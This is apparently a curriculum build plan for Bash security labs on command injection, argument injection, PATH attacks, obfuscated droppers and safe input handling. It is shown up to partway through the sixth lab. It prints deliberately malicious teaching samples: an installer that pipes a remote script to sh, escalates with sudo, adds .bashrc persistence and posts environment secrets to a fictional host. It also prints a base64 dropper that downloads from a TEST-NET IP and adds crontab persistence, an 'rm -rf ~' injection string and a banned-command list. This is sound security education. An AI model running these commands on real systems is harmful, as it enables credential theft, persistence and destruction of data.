# Bash Track — Phase 4 Build Plan (Untrusted Input & Injection)

## Context

**Why this exists.** The `bash` track teaches Bash *security literacy* by making
learners read, decode, audit, and harden code that already exists. Phase 3 ("The
Footgun Gallery," 9 labs) is **closed** — marker `[x]`, git tag `bash-p3`,
close-out commit `9939b4a`, all 9 lab dirs on disk, acceptance suite extended
(`tests/acceptance.sh:471-621`), `(28/28)` catalog. Per `planned_execution.md:7`
the **next unstarted item is `bash p4 — Untrusted Input & Injection` (8 labs)**,
which "needs a PLAN session first (no `docs/plans/bash-p4-plan.md` exists yet)."
This is that plan session. No `p4/` directory exists; no p4 commits/tag exist.

**What Phase 4 is.** From the curriculum map
(`docs/curriculum/bash-literacy-lab-curriculum-v1.md:177-191`): *"The security
phase — the Bash analog of Rust's unsafe/FFI chapter. Command injection (CWE-78)
is Bash's signature vulnerability… This is also where you learn to audit the
scripts you're handed."* Phase outcome (map `:96`): **audit a `curl | bash`
installer; triage suspicious shell.** 8 labs, L4.1–L4.8.

**Intended outcome of the build that follows this plan.** Eight labs authored to
the exact Phase 3 pattern (same dir layout, `meta.json`/`lab.md`/`check.sh`/
`quiz.json`/`hints.json`/`recap.md`/`files/`, same grading harness, same fence),
where **every malicious-pattern sample is static, inert, fictional-domain,
read-only reference material that is never executed by the learner or by
`check.sh` — ever.** All judgment (exact samples, exact flaws, exact answer keys,
exact check logic, quizzes, recaps) is fixed here so the build is mechanical.

---

## Phase 4 lab list (authoritative)

Source: curriculum map `:182-189`. Types are the map's own taxonomy (`:59-68`).
`est_minutes` is assigned here (the map gives only a global 10–20 min contract at
`:78`; `meta.json` requires the field per `tools/lint-labs.sh:120`).

| id | slug (dir) | Title | Type | gate | est |
|----|------------|-------|------|------|-----|
| L4.1 | `L4.1-command-injection` | Command injection — how untrusted data becomes executed code (CWE-78) | AUDIT | no | 15 |
| L4.2 | `L4.2-curl-bash-audit` | The `curl \| bash` audit — reading an installer *before* you pipe it to a shell | AUDIT | no | 15 |
| L4.3 | `L4.3-argument-injection` | Argument injection and the `--` end-of-options guard (CWE-88) | AUDIT | no | 12 |
| L4.4 | `L4.4-env-attacks` | Environment attacks — `PATH`, `IFS`, and untrusted search paths (CWE-426) | AUDIT | no | 15 |
| L4.5 | `L4.5-obfuscated-shell` | Reading obfuscated shell — `base64 \| bash`, hex, and malware-triage basics | AUDIT | no | 15 |
| L4.6 | `L4.6-safe-patterns` | Handling untrusted input *correctly* — the safe patterns | DECODE | no | 12 |
| L4.7 | `L4.7-mktemp-toctou` | Temp files done right — `mktemp` and TOCTOU races (CWE-367) | TAME | no | 15 |
| L4.8 | `L4.8-phase-gate-installer` | **Phase gate:** audit a realistic malicious installer end to end | AUDIT | **yes** | 20 |

Type spread: 6×AUDIT, 1×DECODE (L4.6), 1×TAME (L4.7). One gate: **L4.8**. Total ≈119 min.

**Resolved discrepancy:** the invoking session brief grouped L4.7 (mktemp/TOCTOU)
under "DECODE" alongside L4.6. The curriculum map (`:188`) types it **TAME**
instead — an edit-in-place hardening lab, matching the mktemp/trap rewrite
L4.7 actually asks the learner to perform. This plan follows the map's type
(source of truth per this session's binding-spec instruction), not the brief's
grouping. L4.6 is the phase's only DECODE lab.

---

## Safety-by-design contract for Phase 4 (carries forward from Phase 3)

**No lab ever executes a real malicious action, downloads real content, or runs a
real payload — even a synthetic one.** Concretely, and verified against the repo's
own tooling:

1. **Every malicious sample is a static text file under the lab's `files/`
   directory, mode `0644` (no execute bit), with the banner line 2
   `# TEACHING SAMPLE — intentionally flawed`.** It is `cat`/read/ShellCheck'd,
   never `chmod +x`'d, never sourced, never run.

2. **`files/` is structurally invisible to the repo's linters and to execution.**
   - `tools/lint-labs.sh` only walks `check.sh`, `quiz.json`, `hints.json`,
     `meta.json` per lab dir (`:125-131`) and explicitly documents that
     "deliberately broken teaching samples… live under a lab's `files/`
     directory, which this lint never scans and shellcheck-all.sh never sweeps"
     (`:19-23`).
   - `tools/shellcheck-all.sh` globs only `bin/lab`, `harness/*.sh`, `tools/*.sh`,
     `tracks/*/phases/*/*/check.sh` (`:33-37`) — **never `files/`**.
   - ⇒ Phase 4 samples may freely contain `curl … | sh`, `eval`, `sudo`,
     `base64 -d | bash`, setuid installs, etc. They need no exemption because
     they are never linted, never swept, and never executed.

3. **Fictional infrastructure only.** All hostnames use RFC 2606 reserved
   TLDs/domains (`example.com`, `*.example`, `*.test`, `*.invalid`) and all IPs
   use RFC 5737 TEST-NET ranges (`192.0.2.0/24`, `198.51.100.0/24`,
   `203.0.113.0/24`). No real domain, IP, or malware infrastructure appears
   anywhere. (Note: Phase 3 did **no** networking at all — Phase 4 is the first
   phase to introduce network-shaped samples, so this fictional-infra convention
   is *new* and must be applied uniformly.)

4. **"Should this be safe to pipe to bash?" labs are graded on judgment, not
   execution.** The learner writes a verdict + cited red flags to `answers.txt`;
   `check.sh` matches that written analysis against the answer key. The script
   under audit is never run, by anyone, at any point.

5. **Where a "what would this do?" demo is genuinely needed, use Phase 3 COMMAND
   SHADOWING — never real execution.** Reuse `files/fence.sh` + `files/run-fenced.sh`
   verbatim (byte-identical to L3.2/L3.7/L3.9): the shadow `rm()` **logs the
   reconstructed intent** to `fence.log` (`FENCE-BLOCKED: rm …`) and returns 0,
   mimicking the silent "success" of the disaster without doing it. Only two
   Phase-4 labs invoke a demo at all (L4.1 via the fence; L4.5/L4.8 via
   decode-to-*file*). All other AUDIT labs are pure reading.

6. **Obfuscated blobs are decoded to a FILE and read, never piped to a shell.**
   The learner runs `base64 -d payload.b64 > decoded.txt` and reads `decoded.txt`.
   `check.sh` greps `decoded.txt`; it never pipes a decode into any interpreter.

---

## Global build conventions (replicate Phase 3 exactly)

**Per-lab directory** `tracks/bash/phases/p4/L4.N-slug/` containing:

- `meta.json` — `{ "id","title","type","objective","gate":<bool>,"est_minutes":<int> }`.
  (Required-field lint: `tools/lint-labs.sh:120`.) AUDIT/obfuscation labs may add
  the optional `"teaching_samples"` map if useful.
- `lab.md` — two H2 sections: `## BRIEF` (≤10 lines framing the vulnerability,
  no external reading) then `## GUIDED STEPS` (numbered walkthrough that ends in
  `lab check bash L4.N`). Samples quoted inline in fenced blocks; expected output
  shown as `captured output:`.
- `check.sh` — mode **644**, non-executable. Canonical header (lint-required,
  `:67-70`): `#!/usr/bin/env bash` / `set -euo pipefail` /
  `: "${LAB_WORKSPACE:?…}"` / `: "${LAB_CHECKLIB:?…}"` /
  `# shellcheck source=/dev/null` / `source "$LAB_CHECKLIB"` … `ck_summary`.
- `quiz.json` — **exactly 3** questions, each `{"id","type":"choice",
  "prompt","options":{a,b,c},"answer_b64"}`; answer stored base64
  (`printf '%s' 'b' | base64 -w0` → `Yg==`; `c` → `Yw==`; `a` → `YQ==`).
- `hints.json` — `{"hints":[…]}`, **exactly 3** rungs.
- `recap.md` — **exactly 3** plain-text lines (no headers, no bullets).
- `files/` — the static sample(s) + (where a demo is needed) `fence.sh` +
  `run-fenced.sh`.
- `recall.json` — **L4.1 only** (phase opener), **5** questions, each with a
  `"source"` field naming the earlier lab recalled; graded but never gates.

**Grading helpers** (from `harness/checklib.sh`, sourced via `$LAB_CHECKLIB`):
`assert_file_contains <file> <ERE> <msg>`, `assert_file_contains_fixed`,
`assert_file_not_contains`, `assert_file_exists`, `assert_cmd_ok`,
`assert_cmd_fails`, `assert_output_contains`, `make_decoy_tree <tag>`,
`decoy_intact <tag>`, and terminal `ck_summary` (the only line that may exit 1).

**AUDIT answer-key vocabulary.** Learner writes flat `key=value` lines to
`answers.txt`; grader matches anchored ERE (`^key=value$`). Phase-4 fields:
`line=<N>` (flagged line), `flaw=<slug>` (fixed slug from the brief),
`fix=<free text>` (matched by a safe keyword sub-pattern), **`cwe=<CWE-NN>`**
(NEW in Phase 4 — the map titles cite CWE-78/88/426/367; Phase 3 deliberately
used `flaw=` only and reserved `cwe=` for Phase 4, per `bash-p3-plan.md:298`),
and for multi-finding audits `verdict=<safe|unsafe|malicious>` + per-finding
`<slug>=<line>` maps (mirroring L3.9's `a_rmrf=8 … f_eval=15`).

### ⚠️ Phase-4-specific gotcha: `check.sh` banned-token rule

`tools/lint-labs.sh:83-87` rejects any `check.sh` containing these as **whole
words** (`grep -qw`): `eval`, `sudo`, `curl`, `wget`, `nc`, `ssh`, `sh -c`,
`bash -c`, `pushd`, `bin/lab`. Word boundary = `[A-Za-z0-9_]`, so a **hyphen
counts as a boundary** — a slug like `curl-pipe` *would* trip the ban. Phase-4
graders are constantly tempted to grep for exactly these words. Two rules keep
every `check.sh` clean:

1. **Grade via banned-token-free slugs and keywords.** The entire Phase-4 slug
   vocabulary below is verified free of banned whole-words:
   `command-injection`, `argument-injection`, `untrusted-search-path`,
   `remote-exec`, `remote-download`, `http-binary`, `privilege`, `persistence`,
   `exfil`, `obfuscation`, `hidden-file`, `predictable-temp`, `toctou`,
   `allowlist`, `literal`, `options`, `absolute`, `arguments`, `search_path`,
   `arg_injection`, `remote_exec`, `http_binary`, `predictable_temp`. Free-text
   `fix=`/`redflags=` are matched on safe words (`argument`, `separate`, `--`,
   `quote`, `absolute`, `download`, `read`, `inspect`, `review`) — never on a
   banned literal.
2. **If a banned literal is truly unavoidable in a pattern, split the string
   literal** so the whole word never appears in the `check.sh` source bytes —
   the exact trick L3.8 used for `"ev""al"`. (Not needed by any lab below; the
   slug vocabulary avoids it entirely. Documented as the escape hatch only.)

Also inherited from Phase 3: `check.sh` must contain **no absolute-path literal**
(escape hatch = trailing `# lint-allow: <reason>` + a matching
`tools/lint-allow.txt` entry; `:37-62`) and **no `cd ..` / `cd ~`** (`:91-93`).
Consequence for L4.7: assert on `acme-cache` (no leading `/`), never on
`/tmp/acme-cache`.

---

## Lab entries (build straight from these)

Per-lab template: **(1)** id/title/type/gate/est · **(2)** TEACHING ARTIFACT
(exact static sample + exact flaw(s) + exact answer key) · **(3)** NEVER-EXECUTED
CONFIRMATION · **(4)** CHECK LOGIC · **(5)** QUIZ (3) + RECAP (3). L4.1 also
carries §6 (5 spaced-recall questions). Every sample below is **read-only
reference material, never executed.** Line numbers assume the sample is shipped
byte-for-byte as written (shebang = line 1, banner = line 2); **[VERIFY-AT-BUILD]:
re-confirm each asserted `line=` against the shipped file.**

---

### L4.1 — Command injection — how untrusted data becomes executed code (CWE-78)
**AUDIT · gate:false · est 15 · files/: `lookup.sh`, `fence.sh`, `run-fenced.sh` · recall.json: YES (§6)**
**objective:** "Show exactly where untrusted data crosses into the command
position: find the line that hands a shell a string built from user input, then
rewrite it to pass the value as data."

**(2) TEACHING ARTIFACT** — `files/lookup.sh` (read-only, never executed):
```bash
#!/usr/bin/env bash                                   # line 1
# TEACHING SAMPLE — intentionally flawed              # line 2
# lookup.sh — print the greeting line for a named user.
name=$1                                               # line 4  UNTRUSTED (from a web form)
line=$(bash -c "grep \"^$name:\" greetings.txt")      # line 5  $name spliced into a shell string, re-parsed
echo "$line"                                          # line 6
```
- **Flaw (line 5):** untrusted `$name` is interpolated into a string that a shell
  re-parses and runs (`bash -c "…"`). Input `name='x; rm -rf ~ #'` makes the shell
  execute the injected command. **CWE-78 OS command injection.**
- **Fix:** never build a shell string from input — call the program directly with
  the value as a separate quoted argument and end options: `grep -- "$name" greetings.txt`
  (no `bash -c`). The learner authors this as `hardened.sh`.
- **Answer key** (`answers.txt`):
  ```
  line=5
  flaw=command-injection
  cwe=CWE-78
  fix=call grep directly, pass "$name" as a separate argument, no shell string
  ```

**(3) NEVER-EXECUTED CONFIRMATION:** `check.sh` never runs `lookup.sh`. It greps
`answers.txt` and runs only the learner-authored `hardened.sh`. The injection is
demonstrated once by the learner in GUIDED STEPS via
`bash -- run-fenced.sh lookup.sh 'x; rm -rf ~'` — the destructive `rm` is caught
by the shadow `rm()` and logged as `FENCE-BLOCKED: rm …` in `fence.log`; **nothing
real is executed.**

**(4) CHECK LOGIC:**
- `assert_file_contains "answers.txt" '^line=5$'`
- `assert_file_contains "answers.txt" '^flaw=command-injection$'`
- `assert_file_contains "answers.txt" '^cwe=CWE-78$'`
- `assert_file_contains "answers.txt" '^fix='`
- `assert_file_contains "answers.txt" '(argument|separate|--|quote)'` (fix must pass value as data)
- `assert_file_contains_fixed "fence.log" 'FENCE-BLOCKED: rm'` (demo was fenced)
- `assert_file_exists "hardened.sh"`
- Run learner's `hardened.sh` under the fence with an injection payload →
  `assert_file_not_contains "fence.log" 'FENCE-BLOCKED'` (nothing reached the
  fence — the fix removed the re-parse); and `assert_output_contains` a benign
  result for a normal name. `ck_summary`.

**(5) QUIZ + RECAP:**
- Q1: "Untrusted data becomes executed code the moment it…" a) is stored in a
  variable · **b) is spliced into a string a shell re-parses and runs** · c) contains a space → `Yg==`
- Q2: "The fix for `$(bash -c "grep $name …")` is to…" a) add more quotes ·
  **b) call grep directly with the value as a separate argument — never a built string** · c) escape semicolons → `Yg==`
- Q3: "CWE-78 requires…" a) root · b) a network service ·
  **c) untrusted data reaching a command interpreter** → `Yw==`
- Recap:
  1. `Command injection (CWE-78) is data reaching the command position: the instant untrusted input is re-parsed by a shell (bash -c, eval, backticks, a piped string), its metacharacters become your syntax.`
  2. `The fix is structural, not more quoting — pass the value as a separate quoted argument to the program (grep -- "$name"), so it can never be read as code.`
  3. `Quoting stops word-splitting; only removing the re-parse stops injection — the same lesson as eval (L3.7), one layer up.`

**(6) L4.1 SPACED-RECALL — `recall.json` (5 Q, all sourced from Phase 3).**
Adopted verbatim from the forward draft the P3 build left for this phase
(`bash-p3-plan.md:1294-1320`); shape matches L3.1's `recall.json` exactly
(`id`, `type:"choice"`, `source`, `prompt`, `options{a,b,c}`, `answer_b64`). All
five answers are **b → `Yg==`**. Graded but never gates progression.
1. source `bash L3.2` — "`rm -rf "$DIR/"` with `DIR` unset becomes…" a) a no-op ·
   **b) rm -rf on the filesystem root — it wipes everything** · c) a syntax error
2. source `bash L3.4` — "A file named `-rf` in a dir where you run `rm *`…"
   a) is ignored · **b) sorts first and is parsed as flags -r -f — your flat
   delete goes recursive** · c) causes a syntax error
3. source `bash L3.5` — "`result=$(( n * 2 ))` with `n='a[$(cmd)]'`…" a) prints 0
   and is safe · **b) runs cmd — arithmetic re-evaluates n, and the array
   subscript is command-substituted** · c) is a syntax error
4. source `bash L3.6` — "After `printf … | while read …; do n=$((n+1)); done`, the
   outer `n` is…" a) the loop count · **b) unchanged — the loop ran in a subshell
   and its changes were discarded** · c) undefined
5. source `bash L3.7` — "Building a command string from untrusted input and
   re-parsing it as shell source…" a) is always safe if quoted · **b) turns any
   metacharacter in that input into real syntax — the fix is to remove the
   re-parse, not quote harder** · c) only matters for filenames

---

### L4.2 — The `curl | bash` audit — reading an installer before you pipe it to a shell
**AUDIT · gate:false · est 15 · files/: `install.sh` · recall.json: no**
**objective:** "Read a one-line installer the way an attacker hopes you won't:
render a safe/unsafe verdict and cite every red flag by name before deciding
whether it could ever be piped to a shell."

**(2) TEACHING ARTIFACT** — `files/install.sh` (read-only, **never executed**;
the whole lab is a reading/verdict exercise — there is no fence because nothing
runs):
```sh
#!/bin/sh                                                            # 1
# TEACHING SAMPLE — intentionally flawed                            # 2
# install.sh — "one-line installer" from https://get.example-cdn.test
set -e                                                              # 4
BASE="https://get.example-cdn.test"                                # 5
INSTALL_DIR="${INSTALL_DIR:-/opt/acme}"                            # 6
curl -fsSL "$BASE/stage2.sh" | sh                                  # 8   R1 chained remote script piped to a shell, unread
sudo mkdir -p "$INSTALL_DIR"                                        # 9   R2 silent privilege escalation
curl -fsSL "http://mirror.example-cdn.test/acme-agent" -o /tmp/acme-agent   # 11  R3 plain-HTTP binary (no TLS)
chmod +x /tmp/acme-agent                                            # 12
/tmp/acme-agent --enroll "$BASE"                                    # 13       …then executed
echo "$BASE/agent.sh | sh" >> "$HOME/.bashrc"                       # 14  R4 persistence via shell rc
curl -fsSL -X POST --data "$(env)" "https://telemetry.example-cdn.test/enroll"  # 15  R5 env exfiltration
```
- **Red flags / answer key:** `verdict=unsafe`, plus five slugs — `remote-exec`
  (R1: second remote script `| sh`, unread), `privilege` (R2: `sudo`),
  `http-binary` (R3: plain-HTTP download then execute → MITM RCE), `persistence`
  (R4: appends to `~/.bashrc`), `exfil` (R5: posts `$(env)` — tokens/secrets — to
  a remote endpoint). Plus a `safe_alternative=` line teaching the correct habit.
  ```
  verdict=unsafe
  flag1=remote-exec
  flag2=privilege
  flag3=http-binary
  flag4=persistence
  flag5=exfil
  safe_alternative=download to a file, read it, pin a version, then run
  ```

**(3) NEVER-EXECUTED CONFIRMATION:** `install.sh` is mode 644, no execute bit,
`# TEACHING SAMPLE` banner. `check.sh` **only greps `answers.txt`** — it does not
`curl`, does not pipe anything to a shell, does not source/exec `install.sh`.
Nothing in this lab is executed by anyone; the fictional domains
(`*.example-cdn.test`, `telemetry.example-cdn.test`) are never contacted.

**(4) CHECK LOGIC:**
- `assert_file_contains "answers.txt" '^verdict=unsafe$'`
- one assert per slug present anywhere: `'remote-exec'`, `'privilege'`,
  `'http-binary'`, `'persistence'`, `'exfil'` (all banned-token-free).
- `assert_file_contains "answers.txt" '^safe_alternative='` and
  `'(download|read|inspect|review)'` (the correct behavior).
- `ck_summary`. (No script executed, no fence — parity with the DECODE-style
  pure-grading of L3.3.)

**(5) QUIZ + RECAP:**
- Q1: "`curl https://x/install.sh | bash` is dangerous mainly because…" a) curl is
  slow · **b) you execute code you never read, chosen by whoever controls the
  URL** · c) bash is deprecated → `Yg==`
- Q2: "`curl http://…/agent -o f; chmod +x f; ./f` is worse than HTTPS because…"
  a) http is slower · **b) no TLS means a network attacker can swap the binary for
  their own** · c) chmod is unsafe → `Yg==`
- Q3: "The safe way to handle a one-line installer is to…" a) run it in your home
  dir · **b) download it, read it, and only then decide to run it** · c) pipe it to
  bash as root → `Yg==`
- Recap:
  1. `curl | bash executes whatever the server sends, unread, right now — trusting the URL means trusting every future version of that file and anyone who can MITM it.`
  2. `Audit red flags: chained remote | sh, sudo, plain-HTTP download-and-exec, writes to shell rc (persistence), and anything shipping env/tokens off-box (exfiltration).`
  3. `Safe pattern: fetch to a file, read it end to end, pin a checksum/version, then run — never pipe a URL straight into a shell.`

---

### L4.3 — Argument injection and the `--` end-of-options guard (CWE-88)
**AUDIT · gate:false · est 12 · files/: `stage-upload.sh` · recall.json: no**
**objective:** "Find the command that lets an attacker-chosen value beginning
with `-` be read as an option instead of a filename, and add the `--` guard that
closes it."

**(2) TEACHING ARTIFACT** — `files/stage-upload.sh` (read-only, never executed):
```bash
#!/usr/bin/env bash                                   # 1
# TEACHING SAMPLE — intentionally flawed              # 2
# stage-upload.sh — move an uploaded file (named by the client) into staging.
f=$1                                                  # 4  UNTRUSTED filename from an upload form
mv "$f" staging/                                      # 5  no --: "-t/x" or "--" is parsed as an mv OPTION
```
- **Flaw (line 5):** `$f` is quoted (no word-splitting) but passed to `mv` with no
  `--` end-of-options guard. A value beginning with `-` (e.g. `-t/tmp/attacker`,
  `--`) is consumed as an option, redirecting the move. **CWE-88 argument
  injection.** (BRIEF also names the high-impact variants: `tar
  --checkpoint-action=exec=…`, `rsync -e …` — argument injection that reaches RCE.)
- **Fix:** `mv -- "$f" staging/` (and/or prefix `./"$f"` so a leading dash can't be
  read as an option). Learner authors `hardened.sh`.
- **Answer key** (`answers.txt`):
  ```
  line=5
  flaw=argument-injection
  cwe=CWE-88
  fix=mv -- "$f" staging/  (end-of-options guard; ./ prefix)
  ```

**(3) NEVER-EXECUTED CONFIRMATION:** `check.sh` never runs `stage-upload.sh`. It
greps `answers.txt` and runs only the learner's `hardened.sh` against a **benign
dash-named decoy file** created inside the workspace, asserting the file is
treated as a path (lands in `staging/`), not an option. No destructive action, so
no fence is needed.

**(4) CHECK LOGIC:**
- `assert_file_contains "answers.txt" '^line=5$'`, `'^flaw=argument-injection$'`,
  `'^cwe=CWE-88$'`, `'^fix='`, and `'(--|end.?of.?option|\./)'`.
- `assert_file_exists "hardened.sh"`.
- Behavioral: create a benign workspace file whose name begins with `-` (e.g.
  `./-flag.txt`), run `hardened.sh` with it, `assert_file_exists "staging/-flag.txt"`
  (the `--`/`./` guard made the dash-name a path). `ck_summary`.

**(5) QUIZ + RECAP:**
- Q1: "A filename beginning with `-` is dangerous as an argument because…"
  a) it's hidden · **b) the program reads it as an option/flag, not a path** ·
  c) it's too long → `Yg==`
- Q2: "`mv "$f" dir/` is hardened by…" a) quoting `$f` more · **b) `mv -- "$f"
  dir/` — `--` ends option parsing so `$f` is always a path** · c) checking the
  file exists → `Yg==`
- Q3: "CWE-88 argument injection differs from CWE-78 in that…" a) it needs no
  untrusted input · **b) the input is parsed as options to one program, not as a
  new shell command** · c) it only affects mv → `Yg==`
- Recap:
  1. `Argument injection (CWE-88): untrusted input starting with - is read as an OPTION to the program, silently changing what it does (tar --checkpoint-action=exec, rsync -e, mv -t).`
  2. `The guard is --: everything after it is operands, never options — mv -- "$f" dir/, grep -- "$pat" file; a ./ prefix also defuses a leading dash on a path.`
  3. `Quoting stops word-splitting but not option parsing — "$f" is still -t… to the program; you need -- as well.`

---

### L4.4 — Environment attacks — `PATH`, `IFS`, and untrusted search paths (CWE-426)
**AUDIT · gate:false · est 15 · files/: `healthcheck.sh` · recall.json: no**
**objective:** "Find the line that lets an attacker-writable directory be searched
before the trusted ones, so a dropped file runs as root, and pin a safe PATH."

**(2) TEACHING ARTIFACT** — `files/healthcheck.sh` (read-only, never executed):
```bash
#!/usr/bin/env bash                                   # 1
# TEACHING SAMPLE — intentionally flawed              # 2
# healthcheck.sh — installed by the agent; runs from cron as root.
# CWD at run time is /var/spool/acme, which is group-writable.
PATH=.:/usr/local/bin:$PATH                           # 5  '.' (writable CWD) searched FIRST
if ps aux | grep -q acme-agent; then                  # 6  'ps'/'grep' resolved via the poisoned PATH
  exit 0                                               # 7
fi                                                     # 8
logger "acme-agent not running"                       # 9
```
- **Flaw (line 5):** `PATH=.:…` puts the current directory (a group-writable spool
  dir) ahead of trusted dirs. An attacker who drops `./ps` or `./grep` there gets
  **root** execution when cron runs the script. **CWE-426 untrusted search path.**
  (BRIEF also names the sibling: a hostile inherited `IFS` re-steers unquoted
  splitting — reset `IFS=$' \t\n'` when parsing must be predictable, per L3.3.)
- **Fix:** pin a safe absolute minimal `PATH=/usr/bin:/bin` at the top (never `.`
  or a writable dir), and/or call binaries by absolute path (`/bin/ps`). Learner
  authors `hardened.sh`.
- **Answer key** (`answers.txt`):
  ```
  line=5
  flaw=untrusted-search-path
  cwe=CWE-426
  fix=set an absolute minimal PATH without . (PATH=/usr/bin:/bin), or call by absolute path
  also=IFS
  ```

**(3) NEVER-EXECUTED CONFIRMATION:** `check.sh` never runs `healthcheck.sh`. It
greps `answers.txt` and runs the learner's `hardened.sh` in an environment where
`PATH` is deliberately poisoned and a **benign decoy `./ps` marker-shim** (created
by `check.sh`, contents = `echo pwned > marker`) sits in the workspace — then
asserts the marker was **never written** (the fix reset PATH / used absolute
paths, so the decoy never ran). The decoy is inert; nothing destructive runs, so
no fence is needed.

**(4) CHECK LOGIC:**
- `assert_file_contains "answers.txt" '^line=5$'`, `'^flaw=untrusted-search-path$'`,
  `'^cwe=CWE-426$'`, `'^fix='`, and `'(PATH=/|absolute|/usr/bin|/bin)'`.
- Behavioral: write a decoy `ps` shim into the workspace; run `hardened.sh` with
  `PATH` poisoned (`.` first); `assert_file_not_contains`-style check that
  `marker` was not produced (decoy never fired). `ck_summary`.
  *(Note: `/usr/bin`, `/bin` appear only as answer-key regex alternations, not as
  absolute-path literals executed by check.sh; if the lint flags them, gate the
  alternation on `PATH=/` and `absolute` instead.)*

**(5) QUIZ + RECAP:**
- Q1: "`PATH=.:$PATH` in a root cron job is dangerous because…" a) it's slow ·
  **b) a file the attacker drops in the current dir runs as root before the real
  command** · c) `.` isn't a real path → `Yg==`
- Q2: "CWE-426 untrusted search path is fixed by…" a) quoting variables ·
  **b) setting an absolute, minimal PATH (no `.`, no writable dirs) or calling
  binaries by absolute path** · c) using sudo → `Yg==`
- Q3: "A hostile inherited `IFS` can…" a) do nothing · **b) change how unquoted
  expansions split, re-steering loops and command parsing** · c) only affect echo → `Yg==`
- Recap:
  1. `Untrusted search path (CWE-426): if PATH holds . or any attacker-writable dir, a bare command name (ps, grep) can resolve to the attacker's file — root if the script is privileged.`
  2. `Fix: pin an absolute minimal PATH=/usr/bin:/bin at the top of privileged scripts, or call binaries by absolute path; never trust the inherited environment.`
  3. `IFS is the sibling footgun: an inherited/hostile IFS changes splitting (L3.3) — reset IFS=$' \t\n' when a script's parsing must be predictable.`

---

### L4.5 — Reading obfuscated shell — `base64 | bash`, hex, and malware-triage basics
**AUDIT · gate:false · est 15 · files/: `dropper.sh`, `payload.b64` · recall.json: no**
**objective:** "Triage an obfuscated blob the safe way — decode it to a file, read
it, and extract the indicators of compromise — without ever handing it to a shell."

**(2) TEACHING ARTIFACT** — two static files (both read-only, never executed):

`files/dropper.sh` — shows the obfuscation *shape* (the learner reads it; it is
never run):
```sh
#!/bin/sh                                             # 1
# TEACHING SAMPLE — intentionally flawed / obfuscated (malware-style). Do NOT run.
P="$(cat payload.b64)"                                # 3  the blob
eval "$(printf '%s' "$P" | base64 -d)"               # 4  decode + execute, unseen — the point of obfuscation
```
`files/payload.b64` — base64 of the following plaintext (builder runs
`printf '%s' '<text>' | base64 -w0`; the learner decodes it to `decoded.txt`):
```sh
#!/bin/sh
curl -fsSL http://203.0.113.9/agent.bin -o /tmp/.a
chmod +x /tmp/.a
(/tmp/.a &)
echo '*/5 * * * * /tmp/.a' | crontab -
```
- **What it decodes to / red flags:** downloads a binary from a **hardcoded
  TEST-NET IP over plain HTTP** (`203.0.113.9`), hides it as a **dotfile**
  (`/tmp/.a`), launches it in the **background**, and installs a **crontab
  persistence** entry. Verdict: **malicious.**
- **Answer key** (`answers.txt`) — the triage output:
  ```
  verdict=malicious
  flag1=obfuscation
  flag2=remote-download
  flag3=hidden-file
  flag4=persistence
  c2=203.0.113.9
  ```

**(3) NEVER-EXECUTED CONFIRMATION — the most safety-critical lab:**
- The learner decodes with `base64 -d payload.b64 > decoded.txt` — output to a
  **file**, never `| sh`/`| bash`. GUIDED STEPS explicitly instruct decode-to-file.
- `dropper.sh` (which contains `eval`) is **never executed** by the learner or by
  `check.sh`; it is read-only reference showing the obfuscation shape.
- `check.sh` greps `answers.txt` and `decoded.txt` **only** — it never runs
  `dropper.sh`, never runs the decoded payload, never pipes base64 into any
  interpreter, never contacts `203.0.113.9`. No fence is needed because nothing is
  executed; the shadow-`rm` pattern is on standby but unused here.

**(4) CHECK LOGIC:**
- `assert_file_contains "answers.txt" '^verdict=malicious$'`
- `assert_file_contains "answers.txt" 'obfuscation'`, `'remote-download'`,
  `'persistence'` (banned-token-free slugs).
- `assert_file_contains "answers.txt" '203\.0\.113\.9'` (IOC extracted).
- Proof they decoded to text, not shell: `assert_file_contains_fixed
  "decoded.txt" 'crontab'`. `ck_summary`.

**(5) QUIZ + RECAP:**
- Q1: "`eval "$(printf %s "$P" | base64 -d)"` is a malware-dropper pattern
  because…" a) base64 is encryption · **b) it hides the real commands until
  runtime, when they're decoded and executed unseen** · c) printf is dangerous → `Yg==`
- Q2: "The safe way to triage an obfuscated blob is to…" a) run it in a VM ·
  **b) decode it to a file and read it — never pipe the decode into a shell** ·
  c) delete it → `Yg==`
- Q3: "The strongest indicator of compromise to extract is…" a) the echo text ·
  **b) the hardcoded C2 address and the crontab persistence line** · c) the
  shebang → `Yg==`
- Recap:
  1. `Obfuscation hides intent until runtime: base64 -d | sh, hex/\x escapes, renamed variables — it has no legitimate reason to appear in an installer you're auditing.`
  2. `Triage statically: decode to a FILE and read it — base64 -d blob > out.txt, never base64 -d blob | sh. The decode step must never touch a shell.`
  3. `Pull the IOCs: hardcoded IPs/domains, hidden /tmp/.x files, background launches, and crontab/rc persistence are the triage checklist.`

---

### L4.6 — Handling untrusted input *correctly* — the safe patterns
**DECODE · gate:false · est 12 · files/: `safe-input.sh` · recall.json: no**
**objective:** "Read correct, defensive input-handling code and name why each
guard works — allowlist validation, quoting, `--`, `-F`, and an absolute PATH."

**(2) TEACHING ARTIFACT** — `files/safe-input.sh` (**correct** reference code; a
DECODE lab shows the right answer and asks comprehension):
```bash
#!/usr/bin/env bash                                   # 1
# REFERENCE SAMPLE — correct, defensive handling of untrusted input.
set -euo pipefail                                     # 3
PATH=/usr/bin:/bin                                    # 4  (1) trusted absolute PATH
name=${1:?usage: safe-input.sh <name>}               # 5  (2) require the arg
case $name in                                         # 6  (3) allowlist — accept only safe chars
  *[!a-zA-Z0-9_-]* ) printf 'rejected: %s\n' "$name" >&2; exit 2 ;;   # 7
esac                                                  # 8
grep -F -- "$name" users.txt                          # 9  (4) -F literal, -- ends options, "$name" quoted
```
- **Comprehension answer key** (`answers.txt`, single-word exact-match fields):
  ```
  validation=allowlist
  grep_f=literal
  dashdash=options
  path=absolute
  safest=arguments
  ```
  (line 6 `case` is an **allowlist**; `-F` = **literal** not regex; `--` stops
  option **options** parsing; the pinned PATH is **absolute**; the single most
  important habit is passing untrusted input as **arguments**/data.)

**(3) NEVER-EXECUTED CONFIRMATION:** DECODE parity with L3.3 — `check.sh` grades
pure comprehension by grepping `answers.txt`; it does **not** execute
`safe-input.sh`. (The sample is correct code and safe to run; GUIDED STEPS may
run it to watch it reject bad input, but grading never depends on execution.)

**(4) CHECK LOGIC:** exact-match greps —
`^validation=allowlist$`, `^grep_f=literal$`, `^dashdash=options$`,
`^path=absolute$`, `^safest=arguments$`. `ck_summary`. (All banned-token-free.)

**(5) QUIZ + RECAP:**
- Q1: "The most important habit for untrusted input is…" a) quote everything ·
  **b) pass it as data/arguments to a program, never build a shell string it can
  break out of** · c) base64 it → `Yg==`
